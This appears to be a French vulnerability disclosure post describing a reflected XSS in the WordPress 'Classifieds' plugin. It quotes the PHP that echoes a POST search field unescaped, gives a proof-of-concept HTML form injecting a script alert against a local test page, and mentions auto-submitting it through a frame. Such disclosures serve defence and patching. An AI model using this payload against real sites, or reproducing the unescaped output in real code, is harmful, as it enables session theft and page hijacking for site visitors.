---
title: "Cross-Site Scripting (reflected) dans le plugin Wordpress Classifieds"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin Wordpress [Classifieds](https://wordpress.org/plugins/bee-classifieds/) (slug: `bee-classifieds`) se présente de cette façon :

> A responsive classifieds listings plugin that allows to run your own classified listing site with wordpress.
>
> FEATURES
> * It works with most responsive themes
> * User can post listing from front end
> * User can edit or delete his listings
> * Upload multiple images for listings
> * unique listing image slider
> * light weight
> * listing page title for seo

La dernière version (1.1) testée date d'il y a 7 ans.

## La vulnérabilité

La faille XSS est présente dans le script `bee-listing-template.php` du plugin. En voici le début :

```php
<?php
if ( ! defined( 'ABSPATH' ) ) exit; 

function bee_view_listings() {
  $bee_search_term="";
  if (!empty($_POST)) {
    $bee_search_term=$_POST['listing_search'];
    echo "Search result for   <b>".$bee_search_term.'</b>';
  }
```

Ce script vulnérable ne peut pas être appelé directement, car il nécessite la déclaration de la constante `ABSPATH`.

Le script est toutefois chargé si on se rend sur la page des "listings" (lien `View Listings` en tête de page du Wordpress).

Là, on y trouve le formulaire suivant :

```html
 <form class="search-field" action="http://localhost:8000/?page_id=7" method="post">
  <input type="search" name="listing_search" placeholder="Search&hellip;">
  <input type="submit" value="Search">
  <input type="hidden" name="search_listing" value="beeclassifieds">
```

Comme vu précédemment la variable `$bee_search_term` contenant la valeur du champ `listing_search` est rendue telle quelle dans le navigateur ce qui permet l'injection de code HTML/JS.

PoC :

```html
<form action="http://127.0.0.1:8000/?page_id=7" method="POST">
    <input type="text" name="listing_search" value="<ScRiPt>alert(/XSS/)</sCrIpT>" />
    <input type="hidden" name="search_listing" value="beeclassifieds" />
    <input type="submit" value="go" />
</form>
```

L'injection se faisant uniquement via POST, il faudra utiliser un mécanisme javascript d'auto-submit (par exemple dans une frame) pour réaliser l'exploitation.
